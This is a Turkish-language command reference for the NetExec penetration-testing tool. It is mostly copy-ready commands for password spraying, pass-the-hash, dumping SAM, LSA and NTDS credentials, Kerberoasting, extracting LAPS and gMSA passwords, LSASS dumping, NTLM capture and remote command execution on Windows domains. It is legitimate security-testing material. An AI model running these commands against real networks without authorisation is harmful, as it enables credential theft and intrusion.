# ⚡ NetExec (nxc) - Kapsamlı Başvuru Kılavuzu

[🇺🇸 English Version](../README.md)

```
  ███╗   ██╗███████╗████████╗███████╗██╗  ██╗███████╗ ██████╗ 
  ████╗  ██║██╔════╝╚══██╔══╝██╔════╝╚██╗██╔╝██╔════╝██╔════╝ 
  ██╔██╗ ██║█████╗     ██║   █████╗   ╚███╔╝ █████╗  ██║     
  ██║╚██╗██║██╔══╝     ██║   ██╔══╝   ██╔██╗ ██╔══╝  ██║     
  ██║ ╚████║███████╗   ██║   ███████╗██╔╝ ██╗███████╗╚██████╗ 
  ╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝ 
        The Network Swiss Army Knife (CrackMapExec Successor)
```

<p align="center">
  <img src="https://img.shields.io/badge/NetExec-nxc-blue?style=for-the-badge" alt="NetExec">
  <img src="https://img.shields.io/badge/CME_Successor-Active_Development-green?style=for-the-badge" alt="CME Successor">
  <img src="https://img.shields.io/badge/Multi_Protocol-SMB_LDAP_MSSQL-orange?style=for-the-badge" alt="Multi-Protocol">
  <img src="https://img.shields.io/badge/Network-Pentesting-red?style=for-the-badge" alt="Network Pentesting">
</p>

<p align="center">
  <b>🌐 Ağ ve Active Directory sızma testleri için CrackMapExec'in resmi ve aktif topluluk devamı olan çok amaçlı istismar aracı</b>
</p>

---

## 📋 İçindekiler

- [Giriş](#-giriş)
- [Neden CrackMapExec Yerine NetExec?](#-neden-crackmapexec-yerine-netexec)
- [Kurulum](#-kurulum)
- [Desteklenen Protokoller](#-desteklenen-protokoller)
- [SMB İstismarı](#-smb-i̇stismarı)
  - [Keşif ve Paylaşım (Share) Taraması](#keşif-ve-paylaşım-share-taraması)
  - [Parola Püskürtme (Password Spraying) ve Kimlik Doğrulama](#parola-püskürtme-password-spraying-ve-kimlik-doğrulama)
  - [Pass-the-Hash (PtH) ve Pass-the-Ticket (PtT)](#pass-the-hash-pth-ve-pass-the-ticket-ptt)
  - [Kimlik Bilgisi Dökme (SAM, LSA, NTDS)](#kimlik-bilgisi-dökme-sam-lsa-ntds)
  - [Komut Çalıştırma](#komut-çalıştırma)
- [LDAP İstismarı](#-ldap-i̇stismarı)
  - [Etki Alanı Numaralandırma ve Parola Politikası](#etki-alanı-numaralandırma-ve-parola-politikası)
  - [AS-REP Roasting ve Kerberoasting](#as-rep-roasting-ve-kerberoasting)
  - [LAPS ve gMSA Parolalarını Çekme](#laps-ve-gmsa-parolalarını-çekme)
  - [BloodHound Veri Toplama](#bloodhound-veri-toplama)
- [MSSQL İstismarı](#-mssql-i̇stismarı)
- [WinRM, RDP ve SSH Modülleri](#-winrm-rdp-ve-ssh-modülleri)
- [Popüler NetExec Modülleri (`-M`)](#-popüler-netexec-modülleri--m)
- [Çalışma Alanları (Workspaces) ve Dahili Veritabanı](#-çalışma-alanları-workspaces-ve-dahili-veritabanı)
- [Hızlı Referans Tablosu](#-hızlı-referans-tablosu)
- [İpuçları ve En İyi Pratikler](#-i̇puçları-ve-en-i̇yi-pratikler)
- [Yasal Uyarı](#-yasal-uyarı)
- [Kaynaklar](#-kaynaklar)

---

## 🎯 Giriş

**NetExec** (`nxc`), büyük ölçekli Active Directory ve Windows kurumsal ağlarında sızma testlerini ve istismar sonrası (post-exploitation) aşamaları otomatikleştirmek için tasarlanmış çok amaçlı bir araçtır. **CrackMapExec** (CME) projesinin orijinal yazarı tarafından emekliye ayrılıp arşivlenmesinin ardından topluluk tarafından kurulan resmi ve aktif devam projesidir.

NetExec bir ağ "İsviçre Çakısı" gibi çalışır; SMB, LDAP, MSSQL, WinRM, RDP, SSH, FTP ve VNC protokolleriyle doğrudan konuşarak kimlik doğrulama testlerini, parola püskürtmeyi, kimlik bilgisi dökümünü ve yanal hareketi (lateral movement) tek bir komut satırından otomatikleştirir.

---

## ⚖️ Neden CrackMapExec Yerine NetExec?

| Özellik | CrackMapExec (CME) | NetExec (nxc) |
|---------|--------------------|---------------|
| **Geliştirme Durumu** | 🛑 Arşivlendi / Geliştirilmiyor | 🟢 Aktif Geliştiriliyor |
| **Python Desteği** | Eski (Python 3.8-3.10) | Modern Python 3.10+ |
| **Protokol Desteği** | SMB, LDAP, MSSQL, WinRM, SSH | + VNC, FTP, RDP, WMI geliştirmeleri |
| **BloodHound Desteği** | Yalnızca Eski BloodHound | BloodHound CE & Eski Sürüm |
| **Kerberos & PKINIT** | Sınırlı | Güçlü PKINIT ve Kerberos bilet desteği |
| **Hata Düzeltmeleri** | Donduruldu | Sürekli güncellenen CVE ve istismar modülleri |

---

## 📥 Kurulum

### pipx ile Kurulum (Önerilen)

```bash
pipx install netexec
```

### Kali Linux

NetExec, Kali Linux depolarında CrackMapExec'in yerini almıştır:

```bash
sudo apt update && sudo apt install -y netexec
```

### Docker ile Çalıştırma

```bash
docker run -it --rm -v ~/.nxc:/root/.nxc ghcr.io/penny-os/netexec:latest smb 10.10.10.0/24
```

### Kurulum Doğrulama

```bash
nxc --version
```

---

## 🔌 Desteklenen Protokoller

NetExec ilk argüman olarak hedef protokolü kabul eder:

```bash
nxc <protokol> <hedef(ler)> [seçenekler]
```

- `nxc smb` - Server Message Block (paylaşımlar, SAM/LSA/NTDS dökümü, komut çalıştırma)
- `nxc ldap` - Lightweight Directory Access Protocol (Kerberoasting, BloodHound, LAPS)
- `nxc mssql` - Microsoft SQL Server (veritabanı sorguları, xp_cmdshell, impersonation)
- `nxc winrm` - Windows Remote Management (sessiz komut çalıştırma)
- `nxc rdp` - Remote Desktop Protocol (kimlik doğrulama, ekran görüntüsü alma)
- `nxc ssh` - Secure Shell (Linux/UNIX kimlik denetimi ve komut çalıştırma)
- `nxc ftp` / `nxc vnc` - Dosya Aktarımı ve Uzak Masaüstü

---

## 🛡️ SMB İstismarı

### Keşif ve Paylaşım (Share) Taraması

```bash
# Canlı makineleri bulun ve SMB İmzalama (signing) durumunu kontrol edin
nxc smb 10.10.10.0/24

# Boş (null/anonymous) oturumları listeleyin
nxc smb 10.10.10.50 -u '' -p '' --shares
nxc smb 10.10.10.50 -u 'guest' -p '' --shares

# Geçerli kullanıcı bilgisiyle okunabilir paylaşımları tarayın
nxc smb 10.10.10.0/24 -u 'alice' -p 'Welcome2026!' --shares

# Paylaşımlardaki hassas dosyaları (şifreler, konfigürasyonlar) örümcek modülüyle arayın
nxc smb 10.10.10.50 -u 'alice' -p 'Welcome2026!' -M spider_plus
```

### Parola Püskürtme (Password Spraying) ve Kimlik Doğrulama

```bash
# Hesap kilitlemelerini önlemek için püskürtme öncesi parola politikasını okuyun!
nxc smb 10.10.10.1 -u 'alice' -p 'Welcome2026!' --pass-pol

# Tek bir parolayı tüm kullanıcı listesine karşı deneyin
nxc smb 10.10.10.1 -u users.txt -p 'SeasonYear2026!' --continue-on-success

# Kullanıcı:parola çiftleriyle kimlik doldurma (credential stuffing)
nxc smb 10.10.10.1 -u users.txt -p passwords.txt --no-bruteforce
```

### Pass-the-Hash (PtH) ve Pass-the-Ticket (PtT)

```bash
# NTLM hash kullanarak yerel yönetici yetkisiyle oturum açın
nxc smb 10.10.10.0/24 -u 'Administrator' -H 'fc525c9680e4760a094da0c9ec5f0d94' --local-auth

# Kerberos ccache bileti ile kimlik doğrulayın
export KRB5CCNAME=/path/to/ticket.ccache
nxc smb dc01.corp.local -k --shares
```

### Kimlik Bilgisi Dökme (SAM, LSA, NTDS)

```bash
# Yerel SAM veritabanını dökün (Yönetici yetkisi gerektirir)
nxc smb 10.10.10.50 -u 'Administrator' -H 'hash' --sam

# LSA gizli verilerini çekin (Servis hesapları, açık metin parolalar)
nxc smb 10.10.10.50 -u 'Administrator' -H 'hash' --lsa

# Etki alanı denetleyicisinde NTDS.dit veritabanını VSS ile dökün
nxc smb 10.10.10.1 -u 'Administrator' -p 'Password123' --ntds
```

### Komut Çalıştırma

```bash
# WMI üzerinden komut çalıştırın (varsayılan)
nxc smb 10.10.10.50 -u 'Administrator' -p 'Pass123' -x 'whoami /all'

# PowerShell ile komut çalıştırın
nxc smb 10.10.10.50 -u 'Administrator' -p 'Pass123' -X 'Get-Process'

# SMBexec veya atexec üzerinden komut çalıştırma
nxc smb 10.10.10.50 -u 'Administrator' -p 'Pass123' --exec-method smbexec -x 'ipconfig'
```

---

## 🌳 LDAP İstismarı

### Etki Alanı Numaralandırma ve Parola Politikası

```bash
# Etki alanı kullanıcılarını listeleyin
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --users

# Grupları ve üyelikleri çekin
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --groups

# Aktif etki alanı bilgisayarlarını listeleyin
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --computers
```

### AS-REP Roasting ve Kerberoasting

```bash
# AS-REP Roasting zafiyeti bulunan hesapları bulun ve biletlerini dökün
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --asreproast asrep_hashes.txt

# Kerberos servis biletlerini isteyin (Kerberoasting)
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --kerberoasting kerberoast_hashes.txt
```

### LAPS ve gMSA Parolalarını Çekme

```bash
# LAPS (Local Administrator Password Solution) yerel yönetici parolalarını çekin
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' -M laps

# Grup Yönetilen Hizmet Hesabı (gMSA) parolalarını dışa aktarın
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' -M gmsa
```

### BloodHound Veri Toplama

```bash
# LDAP üzerinden doğal BloodHound veri toplaması gerçekleştirin
nxc ldap 10.10.10.1 -u 'alice' -p 'Welcome2026!' --bloodhound --collection All
```

---

## 🗄️ MSSQL İstismarı

```bash
# Ağ genelinde MSSQL kimlik doğrulaması test edin
nxc mssql 10.10.10.0/24 -u 'sa' -p 'DatabasePassword!'

# Sunucu bağlantıları (linked servers) üzerinden yetki yükseltme kontrolü
nxc mssql 10.10.10.75 -u 'sa' -p 'DatabasePassword!' -M enum_links

# xp_cmdshell'i etkinleştirip işletim sistemi komutu çalıştırın
nxc mssql 10.10.10.75 -u 'sa' -p 'DatabasePassword!' -x 'whoami'

# xp_dirtree ile NetNTLMv2 hash yakalayın
nxc mssql 10.10.10.75 -u 'sa' -p 'DatabasePassword!' -M capture-ntlm -o IP=192.168.1.100
```

---

## 🚀 WinRM, RDP ve SSH Modülleri

### WinRM Komut Çalıştırma
```bash
nxc winrm 10.10.10.50 -u 'Administrator' -p 'Pass123' -x 'whoami'
```

### RDP Ekran Görüntüsü ve Giriş Kontrolü
```bash
# RDP girişini doğrulayıp kilit ekranı görüntüsünü kaydedin
nxc rdp 10.10.10.50 -u 'Administrator' -p 'Pass123' --screenshot
```

### SSH Püskürtme ve Komutlar
```bash
nxc ssh 10.10.10.0/24 -u 'root' -p 'toor' -x 'id'
```

---

## 🧩 Popüler NetExec Modülleri (`-M`)

| Modül | Protokol | Açıklama | Örnek |
|-------|----------|----------|-------|
| `spooler` | SMB | Print Spooler servisinin çalışıp çalışmadığını kontrol eder (PrinterBug) | `nxc smb <IP> -M spooler` |
| `zerologon` | SMB | CVE-2020-1472 zafiyetini test eder | `nxc smb <IP> -M zerologon` |
| `nopac` | SMB | CVE-2021-42278 / CVE-2021-42287 zafiyetini denetler | `nxc smb <IP> -M nopac` |
| `petitpotam` | SMB | PetitPotam zorlamasına açık olup olmadığını doğrular | `nxc smb <IP> -M petitpotam` |
| `nanodump` | SMB | LSASS bellek dökümünü nanodump ile sessizce alır | `nxc smb <IP> -u admin -p pass -M nanodump` |
| `webdav` | SMB | WebDAV relay için WebClient servis durumunu inceler | `nxc smb <IP> -M webdav` |
| `laps` | LDAP | İstemcilerin LAPS yönetici parolalarını çeker | `nxc ldap <IP> -u u -p p -M laps` |
| `gmsa` | LDAP | gMSA servis hesaplarının gizli verilerini döker | `nxc ldap <IP> -u u -p p -M gmsa` |

---

## 💾 Çalışma Alanları (Workspaces) ve Dahili Veritabanı

NetExec, keşfedilen tüm hostları, geçerli hesapları ve dökülen hash'leri yerel bir SQLite veritabanına (`~/.nxc/workspaces/`) otomatik kaydeder:

```bash
# Kayıtlı tüm kimlik bilgilerini listeleyin
nxc-database credentials

# Keşfedilen ana makineleri listeleyin
nxc-database hosts

# Müşteri veya proje bazlı yeni bir çalışma alanı oluşturun
nxc-database workspace create MusteriAlfa
nxc-database workspace switch MusteriAlfa
```

---

## 📊 Hızlı Referans Tablosu

| Görev | Protokol | Komut |
|-------|----------|-------|
| **Paylaşımları Listeleme** | SMB | `nxc smb <IP> -u '' -p '' --shares` |
| **Parola Politikasını Kontrol**| SMB | `nxc smb <DC> -u 'user' -p 'pass' --pass-pol` |
| **Parola Püskürtme** | SMB | `nxc smb <IP> -u users.txt -p 'Pass' --continue-on-success` |
| **Pass the Hash** | SMB | `nxc smb <IP> -u 'admin' -H <NT_HASH> --local-auth` |
| **SAM Dökümü** | SMB | `nxc smb <IP> -u 'admin' -H <HASH> --sam` |
| **NTDS Dökümü** | SMB | `nxc smb <DC> -u 'admin' -p 'pass' --ntds` |
| **AS-REP Roasting** | LDAP | `nxc ldap <DC> -u 'user' -p 'pass' --asreproast hashes.txt` |
| **Kerberoasting** | LDAP | `nxc ldap <DC> -u 'user' -p 'pass' --kerberoasting hashes.txt` |
| **BloodHound Çıktısı** | LDAP | `nxc ldap <DC> -u 'user' -p 'pass' --bloodhound --collection All` |
| **MSSQL xp_cmdshell** | MSSQL | `nxc mssql <IP> -u 'sa' -p 'pass' -x 'whoami'` |

---

## 💡 İpuçları ve En İyi Pratikler

1. **Önce Daima Parola Politikasını Kontrol Edin:**
   Parola denemesi yapmadan önce mutlaka `nxc smb <DC> -u <KULLANICI> -p <PAROLA> --pass-pol` çalıştırarak `Account Lockout Threshold` değerini öğrenin. Eşik 3 veya 5 ise hesapların kilitlenmemesi için periyodik aralıklarla tek parola deneyin.
2. **İstemcilerde `--local-auth` Kullanın:**
   Etki alanı yerine yerel yönetici parolalarını iş istasyonlarında test ederken daima `--local-auth` parametresini ekleyin.
3. **Pivoting ile Kullanım:**
   NetExec, SOCKS vekilleri (`proxychains nxc smb ...`) veya Ligolo-ng TUN arayüzü üzerinden doğal çekirdek hızında sorunsuz çalışır!

---

## ⚠️ Yasal Uyarı

> **ÖNEMLİ:** NetExec ofansif bir güvenlik denetim aracıdır. Yalnızca yazılı izin alınmış sistemlerde ve yetkili sızma testi sözleşmeleri kapsamında kullanılmalıdır.

---

## 📚 Kaynaklar

- [NetExec Resmi GitHub Deposu](https://github.com/Pennyw0rth/NetExec)
- [Resmi NetExec Dokümantasyonu](https://www.netexec.wiki/)
